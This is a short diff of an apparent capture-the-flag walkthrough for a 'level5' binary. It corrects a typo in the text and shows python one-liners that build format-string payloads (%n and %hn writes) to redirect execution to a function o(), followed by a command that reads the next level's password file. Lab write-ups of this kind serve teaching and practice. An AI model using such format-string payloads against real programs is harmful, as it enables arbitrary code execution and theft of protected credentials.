@@ -37,7 +37,7 @@ str => `addr exit` + nb_chr %offset$n\
 
 `python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5` << this is valid but let try a faster way cause waiting 134 513 824 space to print is long
 
-We can split the addr of 0 in 2 and but it in 2 time :\
+We can split the addr of o() in 2 and put it in 2 time :\
 `python -c "print '\x38\x98\x04\x08' + '%2048x%4\$hn' + '%31904x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5`
 ```
 cat /home/user/level6/.pass
